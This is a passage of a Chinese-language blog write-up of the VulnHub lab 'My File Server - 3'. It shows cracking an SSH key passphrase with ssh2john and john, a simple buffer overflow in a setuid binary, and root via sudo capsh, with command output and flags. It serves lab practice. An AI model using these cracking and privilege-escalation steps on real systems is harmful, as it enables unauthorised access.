class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">l, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n):</span><br><span class="line">        <span class="keyword">yield</span> l[i:i + n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSADSSKey</span> (<span class="params">PKey</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None, filename=None, password=None, vals=None, file_obj=None</span>):</span></span><br><span class="line">        self.n = <span class="literal">None</span></span><br><span class="line">        self.e = <span class="literal">None</span></span><br><span class="line">        self.d = <span class="literal">None</span></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.q = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> file_obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key(file_obj, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key_file(filename, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> vals <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.e, self.n = vals</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hash__</span>(<span class="params">self</span>):</span></span><br><span class="line">        h = hash(self.get_name())</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.e)</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.n)</span><br><span class="line">        <span class="keyword">return</span> hash(h)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.size</span><br><span class="line"></span><br><span class="line">    <span class="comment">###  internals...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key_file</span>(<span class="params">self, filename, password</span>):</span></span><br><span class="line">        data = self._read_private_key_file(<span class="string">&#x27;RSA&#x27;</span>, filename, password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % filename)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key</span>(<span class="params">self, file_obj, password</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;used for converting older format hashes&quot;&quot;&quot;</span></span><br><span class="line">        data = self._read_private_key(<span class="string">&#x27;RSA&#x27;</span>, file_obj, password)</span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % file_obj.name)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># RSAPrivateKey = &#123; version = 0, n, e, d, p, q, d mod p-1, d mod q-1, q**-1 mod p &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">4</span>) <span class="keyword">or</span> (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Not a valid RSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.n = keylist[<span class="number">1</span>]</span><br><span class="line">        self.e = keylist[<span class="number">2</span>]</span><br><span class="line">        self.d = keylist[<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># not really needed</span></span><br><span class="line">        self.p = keylist[<span class="number">4</span>]</span><br><span class="line">        self.q = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_dss_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># DSAPrivateKey = &#123; version = 0, p, q, g, y, x &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file: &#x27;</span> + str(e))</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">6</span>) <span class="keyword">or</span> \</span><br><span class="line">                (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;not a valid DSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.p = keylist[<span class="number">1</span>]</span><br><span class="line">        self.q = keylist[<span class="number">2</span>]</span><br><span class="line">        self.g = keylist[<span class="number">3</span>]</span><br><span class="line">        self.y = keylist[<span class="number">4</span>]</span><br><span class="line">        self.x = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PKCS7Encoder is borrowed from http://japrogbits.blogspot.in/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKCS7Encoder</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    RFC 2315: PKCS#7 page 21</span></span><br><span class="line"><span class="string">    Some content-encryption algorithms assume the</span></span><br><span class="line"><span class="string">    input length is a multiple of k octets, where k &gt; 1, and</span></span><br><span class="line"><span class="string">    let the application define a method for handling inputs</span></span><br><span class="line"><span class="string">    whose lengths are not a multiple of k octets. For such</span></span><br><span class="line"><span class="string">    algorithms, the method shall be to pad the input at the</span></span><br><span class="line"><span class="string">    trailing end with k - (l mod k) octets all having value k -</span></span><br><span class="line"><span class="string">    (l mod k), where l is the length of the input. In other</span></span><br><span class="line"><span class="string">    words, the input is padded at the trailing end with one of</span></span><br><span class="line"><span class="string">    the following strings:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">             01 -- if l mod k = k-1</span></span><br><span class="line"><span class="string">            02 02 -- if l mod k = k-2</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">          k k ... k k -- if l mod k = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The padding can be removed unambiguously since all input is</span></span><br><span class="line"><span class="string">    padded and no padding string is a suffix of another. This</span></span><br><span class="line"><span class="string">    padding method is well-defined if and only if k &lt; 256;</span></span><br><span class="line"><span class="string">    methods for larger k are an open issue for further study.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, k=<span class="number">16</span></span>):</span></span><br><span class="line">        self.k = k</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The padded text for which the padding is to be removed.</span></span><br><span class="line">    <span class="comment"># @exception ValueError Raised when the input padding is missing or corrupt.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Remove the PKCS#7 padding from a text string</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        nl = len(text)</span><br><span class="line">        val = int(binascii.hexlify(text[<span class="number">-1</span>]), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> val &gt; self.k:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Input is not padded or padding is corrupt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        l = nl - val</span><br><span class="line">        <span class="keyword">return</span> text[:l]</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The text to encode.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad an input string according to PKCS#7</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        l = len(text)</span><br><span class="line">        output = StringIO()</span><br><span class="line">        val = self.k - (l % self.k)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(val):</span><br><span class="line">            output.write(<span class="string">&#x27;%02x&#x27;</span> % val)</span><br><span class="line">        <span class="keyword">return</span> text + binascii.unhexlify(output.getvalue())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;Usage: %s &lt; RSA/DSA private key files &gt;\n&quot;</span> % \</span><br><span class="line">                sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">        key = RSADSSKey.from_private_key_file(filename, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>破解得到密码为password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# vim ssh2john.py</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# chmod +x ssh2john.py </span><br><span class="line">root@JIYE:~/vulnhub/ck00# ./ssh2john.py id_rsa &gt; id.hash</span><br><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id.hash  id_rsa  nmap.CVT  nmap.sP  ssh2john.py  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id</span><br><span class="line">id.hash  id_rsa   </span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">password         (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:03 DONE (2020-09-25 20:47) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x09-登入"><a href="#0x09-登入" class="headerlink" title="0x09.登入"></a>0x09.登入</h2><p><code>修改id_rsa权限为600</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# chmod 600 id_rsa </span><br><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# ssh -i id_rsa smbuser@192.168.1.14</span><br><span class="line">load pubkey &quot;id_rsa&quot;: invalid format</span><br><span class="line"></span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      InfoSec Warrior                                       #</span><br><span class="line">   #                         --------- www.InfoSecWarrior.com ------------                      #</span><br><span class="line">   #                                    My File Server - 3                                      #</span><br><span class="line">   #                        Just a simple addition to the problem                               #</span><br><span class="line">   #                               Designed By :- CyberKnight                                   #</span><br><span class="line">   #                                Twitter    :- @CyberKnight00                                #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Last login: Thu Mar 19 10:15:35 2020 from 192.168.56.1</span><br><span class="line">[smbuser@fileserver ~]$ whoami</span><br><span class="line">smbuser</span><br><span class="line">[smbuser@fileserver ~]$</span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><p><code>查看用户，有一个bla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ cd /home</span><br><span class="line">[smbuser@fileserver home]$ ls</span><br><span class="line">bla  smbuser</span><br><span class="line">[smbuser@fileserver home]$</span><br></pre></td></tr></table></figure><p><code>查找后期安装软件的运行脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver home]$ cd /usr/bin/</span><br><span class="line">[smbuser@fileserver bin]$ ls -la | grep bla</span><br><span class="line">-rwsr-xr-x    1 bla  bla        7546 2月  27 2020 esclate</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>经过查发现esclate存在bufferoverflow（缓冲区溢出）</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1</span><br><span class="line">Why are you here ?!</span><br><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111111111111111111111111111</span><br><span class="line">段错误</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>输入34个字符，即可正确溢出</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">bla</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ cd /home/bla/</span><br><span class="line">sh-4.2$ ls</span><br><span class="line">user.txt  ynetd</span><br><span class="line">sh-4.2$ cat user.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _____ _ _      ____                                     _____ </span><br><span class="line"> |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / </span><br><span class="line"> | |_  | | |/ _ \___ \ / _ \ &#x27;__\ \ / / _ \ &#x27;__|  _____    |_ \ </span><br><span class="line"> |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |</span><br><span class="line"> |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/ </span><br><span class="line">                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f</span><br><span class="line"></span><br><span class="line">you can crack this hash, because it is also my pasword</span><br><span class="line"></span><br><span class="line">note: crack it, itiseasy</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>根据提示，flag就是bla密码,下面进行解码</code></p><p><code>解码为itiseasy</code></p><img src="/2020/09/26/CK-03/image-20200926095848740.png"><p><code>登入bla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ su bla</span><br><span class="line">密码：</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>提权，可以看到/usr/sbin/capsh不需要密码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo -l</span><br><span class="line">匹配此主机上 bla 的默认条目：</span><br><span class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span><br><span class="line">    LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS</span><br><span class="line">    _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">用户 bla 可以在该主机上运行以下命令：</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>查看/usr/sbin/capsh参数，可以看到--为重新生成参数/bin/bash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ &#x2F;usr&#x2F;sbin&#x2F;capsh -h</span><br><span class="line">usage: &#x2F;usr&#x2F;sbin&#x2F;capsh [args ...]</span><br><span class="line">  --help         this message (or try &#39;man capsh&#39;)</span><br><span class="line">  --print        display capability relevant state</span><br><span class="line">  --decode&#x3D;xxx   decode a hex string to a list of caps</span><br><span class="line">  --supports&#x3D;xxx exit 1 if capability xxx unsupported</span><br><span class="line">  --drop&#x3D;xxx     remove xxx,.. capabilities from bset</span><br><span class="line">  --caps&#x3D;xxx     set caps as per cap_from_text()</span><br><span class="line">  --inh&#x3D;xxx      set xxx,.. inheritiable set</span><br><span class="line">  --secbits&#x3D;&lt;n&gt;  write a new value for securebits</span><br><span class="line">  --keep&#x3D;&lt;n&gt;     set keep-capabability bit to &lt;n&gt;</span><br><span class="line">  --uid&#x3D;&lt;n&gt;      set uid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --gid&#x3D;&lt;n&gt;      set gid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --groups&#x3D;g,... set the supplemental groups</span><br><span class="line">  --user&#x3D;&lt;name&gt;  set uid,gid and groups to that of user</span><br><span class="line">  --chroot&#x3D;path  chroot(2) to this path</span><br><span class="line">  --killit&#x3D;&lt;n&gt;   send signal(n) to child</span><br><span class="line">  --forkfor&#x3D;&lt;n&gt;  fork and make child sleep for &lt;n&gt; sec</span><br><span class="line">  &#x3D;&#x3D;             re-exec(capsh) with args as for --</span><br><span class="line">  --             remaing arguments are for &#x2F;bin&#x2F;bash</span><br><span class="line">                 (without -- [&#x2F;usr&#x2F;sbin&#x2F;capsh] will simply exit(0))</span><br><span class="line">[bla@fileserver ~]$ </span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo /usr/sbin/capsh --</span><br><span class="line">[root@fileserver bla]# whoami</span><br><span class="line">root</span><br><span class="line">[root@fileserver bla]# cd</span><br><span class="line">[root@fileserver ~]# ls</span><br><span class="line">proof.txt</span><br><span class="line">[root@fileserver ~]# cat proof.txt </span><br><span class="line">    _______ __    _____                                       _____</span><br><span class="line">   / ____(_) /__ / ___/___  ______   _____  _____            |__  /</span><br><span class="line">  / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; </span><br><span class="line"> / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / </span><br><span class="line">/_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  </span><br><span class="line">                                                                   </span><br><span class="line"></span><br><span class="line">flag : 7be300997079eaebcdf9975ede6746e9</span><br><span class="line">[root@fileserver ~]#</span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/09/26/CK-03/" title="CK-03">https://lunamoore.github.io/2020/09/26/CK-03/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶机</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/09/19/HTB-blunder/" rel="prev" title="HTB-[blunder]"><i class="fa fa-chevron-left"></i> HTB-[blunder]</a></div><div class="post-nav-item"><a href="/2020/10/01/HTB-cache/" rel="next" title="HTB-[cache]">HTB-[cache] <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">516k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">7:49</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var 